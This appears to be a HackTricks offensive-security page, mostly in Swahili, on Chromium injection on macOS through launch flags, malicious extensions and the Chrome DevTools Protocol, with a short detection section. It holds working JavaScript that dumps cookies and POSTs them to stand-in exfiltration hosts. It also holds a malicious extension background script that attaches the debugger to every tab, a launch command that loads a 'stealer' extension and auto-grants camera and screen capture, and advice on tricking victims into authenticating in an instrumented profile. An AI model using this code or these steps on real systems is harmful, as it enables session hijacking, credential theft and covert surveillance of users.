# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Browsers zinazotumia Chromium kama Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, na Opera zote hutumia command-line switches, preference files, na DevTools automation interfaces zilezile. Kwenye macOS, mtumiaji yeyote mwenye GUI access anaweza kusitisha browser session iliyopo na kuifungua tena ikiwa na flags, extensions, au DevTools endpoints kiholela zinazotumia entitlements za target.

#### Kuanzisha Chromium ikiwa na custom flags kwenye macOS

macOS huhifadhi UI instance moja kwa kila Chromium profile, hivyo instrumentation kwa kawaida huhitaji kufunga browser kwa nguvu (kwa mfano kwa `osascript -e 'tell application "Google Chrome" to quit'`). Attackers kwa kawaida huizindua tena kupitia `open -na "Google Chrome" --args <flags>` ili waweze kuingiza arguments bila kubadilisha app bundle. Kuweka command hiyo ndani ya user LaunchAgent (`~/Library/LaunchAgents/*.plist`) au login hook huhakikisha kuwa browser iliyoharibiwa inazinduliwa tena baada ya reboot/logoff.

#### `--load-extension` Flag

`--load-extension` flag hupakia kiotomatiki extensions ambazo hazijapakiwa (paths zilizotenganishwa kwa koma). Iunganishe na `--disable-extensions-except` ili kuzuia extensions halali huku ukilazimisha payload yako pekee iendeshe. Malicious extensions zinaweza kuomba permissions zenye athari kubwa kama `debugger`, `webRequest`, na `cookies` ili kuingia kwenye DevTools protocols, kurekebisha CSP headers, kushusha usalama wa HTTPS, au ku-exfiltrate session material mara tu browser inapoanza.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Switches hizi hufichua Chrome DevTools Protocol (CDP) kupitia TCP au pipe ili external tooling iweze kuendesha browser. Google ilibaini matumizi makubwa ya interface hii na infostealers na, kuanzia Chrome 136 (Machi 2025), switches hizi hupuuziwa kwa default profile isipokuwa browser izinduliwe ikiwa na `--user-data-dir` isiyo ya kawaida. Hii hulazimisha App-Bound Encryption kwenye profiles halisi, lakini attackers bado wanaweza kuanzisha profile mpya, kumshawishi victim athenticate ndani yake (phishing/triage assistance), na kuvuna cookies, tokens, device trust states, au WebAuthn registrations kupitia CDP.

#### `--user-data-dir` Flag

Flag hii huelekeza browser profile nzima (History, Cookies, Login Data, Preference files, n.k.) kwenye path inayodhibitiwa na attacker. Ni lazima unapotumia builds za kisasa za Chrome pamoja na `--remote-debugging-port`, na pia huweka tampered profile ikiwa imetengwa ili uweze kuweka files za `Preferences` au `Secure Preferences` zilizojazwa awali ambazo huzima security prompts, hu-install extensions kiotomatiki, na kubadilisha default schemes.

#### `--use-fake-ui-for-media-stream` Flag

Switch hii hupita permission prompt ya camera/mic ili page yoyote inayotumia `getUserMedia` ipate access mara moja. Iunganishe na flags kama `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, au CDP `Browser.grantPermissions` commands ili kunasa audio/video, kushiriki desktop, au kutimiza WebRTC permission checks kimya bila user interaction.

## Delivery & Relaunch Patterns Zinazoonekana Kwenye Mashambulizi Halisi

CDP abuse kwa kawaida ni hatua ya **post-exploitation** badala ya payload ya mwanzo. Campaign ya hivi karibuni ya macOS iliyolenga developers ilitumia **`Run Script` build phase** yenye sumu (`PBXShellScriptBuildPhase`) ili code ianze kutekelezwa tu victim **alipo-build** project, si alipo-clone au kuifungua tu. Baada ya execution hiyo ya kwanza, malware pia iliambukiza miti mingine ya `.xcodeproj`, ikaongeza malicious Git `pre-commit` hooks, na kutafuta Xcode projects zaidi ndani ya ZIP archives.

Kwa Chromium abuse, hili ni muhimu kwa sababu attacker hahitaji kubadilisha browser binary yenyewe. Build-phase / `osascript` stager ya muda mfupi inaweza badala yake kusakinisha **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher, n.k.) ambayo hufungua tena browser halali ikiwa na flags zinazodhibitiwa na attacker kila mara user anapoianzisha.

> [!TIP]
> Kwenye developer endpoints, kagua files za `.pbxproj`, `.git/hooks/pre-commit`, na ZIPs zilizo na `.xcodeproj` kwa `curl`, `osascript`, `xxd`, `base64` iliyowekwa ndani mara nyingi, au logic isiyotarajiwa ya kuanzisha Chrome tena.

## Remote Debugging & DevTools Protocol Abuse

Baada ya Chrome kuanzishwa tena ikiwa na `--user-data-dir` maalum na `--remote-debugging-port`, unaweza ku-attach kupitia CDP (kwa mfano kupitia `chrome-remote-interface`, `puppeteer`, au `playwright`) na kuscript workflows zenye privileges za juu:

- **Cookie/session theft:** `Network.getAllCookies` na `Storage.getCookies` hurudisha HttpOnly values hata wakati App-Bound encryption kwa kawaida ingezuia filesystem access, kwa sababu CDP huomba browser inayoendesha izidecrypt.
- **Permission tampering:** `Browser.grantPermissions` na `Emulation.setGeolocationOverride` hukuruhusu kupita camera/mic prompts (hasa zikichanganywa na `--use-fake-ui-for-media-stream`) au kughushi location-based security checks.
- **Keystroke/script injection:** `Runtime.evaluate` hutekeleza JavaScript kiholela ndani ya active tab, ikiwezesha credential lifting, DOM patching, au kuingiza persistence beacons ambazo hudumu hata baada ya navigation.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` na `Fetch.enable` hu-intercept authenticated requests/responses kwa wakati halisi bila kugusa disk artifacts.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Kwa sababu Chrome 136 inazuia CDP kwenye profile chaguomsingi, kunakili directory iliyopo ya mwathiriwa ya `~/Library/Application Support/Google/Chrome` kwenda kwenye staging path hakutoi tena cookies zilizodecryptiwa. Badala yake, mfanye mtumiaji athibitishe utambulisho wake ndani ya profile iliyowekewa instrumentation (kwa mfano, kupitia session ya msaada ya "kusaidia") au capture MFA tokens zinapopita kupitia network hooks zinazodhibitiwa na CDP.

### XCSSET-style CDP Backdoor Chain

Muundo wa vitendo wa malware ni:

1. Restart userland implant au wrapper kila Chrome inapozinduliwa.
2. Spawn browser halali ikiwa na `--remote-debugging-port=<port>` na, kwenye Chrome 136+, kwa kawaida paired non-default `--user-data-dir=<dir>`.
3. Start helper inayounganisha kwenye local CDP WebSocket na kusajili pre-document hook kwa kutumia `Page.addScriptToEvaluateOnNewDocument`.

Helper hiyo inaweza ku-inject JavaScript **kabla** site code haija-run, jambo linalofaa kwa hooking `window.fetch`, `XMLHttpRequest`, wallet providers, au autofill flows bila ku-patch files zilizo kwenye disk.
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
A stronger variant turns the browser into a **host command bridge**: injected JavaScript emits a delimiter-tagged `console.log`, the local helper watches `Runtime.consoleAPICalled`, strips the marker, executes the remainder through the host shell (for example Go's `exec.Command`), and returns stdout/stderr over the attacker's WebSocket. Hii huboresha tab-level script execution kuwa reverse shell isiyotegemea mafaili kwa kiasi kikubwa.

## Extension-Based Injection via Debugger API

Utafiti wa 2023 wa "Chrowned by an Extension" ulionyesha kuwa extension hasidi inayotumia `chrome.debugger` API inaweza kuunganishwa kwenye tab yoyote na kupata nguvu zilezile za DevTools kama `--remote-debugging-port`. Hilo huvunja dhana za awali za isolation (extensions hubaki kwenye context yao) na kuwezesha:

- Wizi wa kimya wa cookies na credentials kwa kutumia `Network.getAllCookies`/`Fetch.getResponseBody`.
- Marekebisho ya site permissions (camera, microphone, geolocation) na bypass ya security interstitial, hivyo kuruhusu phishing pages kuiga Chrome dialogs.
- On-path tampering ya TLS warnings, downloads, au WebAuthn prompts kwa kuendesha programmatically `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, au `Security.handleCertificateError`.

Load extension kwa kutumia `--load-extension`/`--disable-extensions-except` ili hakuna user interaction inayohitajika. Minimal background script inayotumia API hii kwa mashambulizi inaonekana hivi:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Extension inaweza pia kujiunga na matukio ya `Debugger.paused` ili kusoma variables za JavaScript, kurekebisha inline scripts, au kuweka breakpoints maalum zinazoendelea kufanya kazi baada ya navigation. Kwa kuwa kila kitu huendeshwa ndani ya GUI session ya mtumiaji, Gatekeeper na TCC hazianzishwi, hivyo mbinu hii ni bora kwa malware ambayo tayari imepata execution chini ya user context.

## Detection & Hunting

- Toa alert kwa Chromium browsers zinazoanzishwa kwa `--remote-debugging-port`, `--remote-debugging-pipe`, au `--user-data-dir` yenye mashaka, hasa parent ikiwa ni `bash`, `sh`, `osascript`, `xcodebuild`, au LaunchAgent helper.
- Tafuta chains fupi ambapo helper hufungua local CDP WebSocket, husajili `Page.addScriptToEvaluateOnNewDocument`, kisha hufanya outbound WebSocket/HTTPS connection ya muda mrefu.
- Hunt kwa console-to-shell bridges kwa kuoanisha shughuli za browser `Runtime.consoleAPICalled` na child shells au helper processes zinazotekeleza commands zilizopewa na attacker.
- Kwenye developer Macs, kagua entries za `.pbxproj` `PBXShellScriptBuildPhase`, Git `pre-commit` hooks, Dock/login item relaunchers, na Xcode projects zilizo ndani ya ZIP kwa usakinishaji wa browser wrapper.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Zana

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Huwezesha kiotomatiki uzinduzi wa Chromium kwa payload extensions na kufichua CDP hooks shirikishi.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Tooling inayofanana, inayolenga traffic interception na browser instrumentation kwa waendeshaji wa macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js library ya ku-script Chrome DevTools Protocol dumps (cookies, DOM, permissions) pindi instance yenye `--remote-debugging-port` inapokuwa live.

### Mfano
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Pata mifano zaidi kwenye viungo vya tools.

## Marejeo

- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
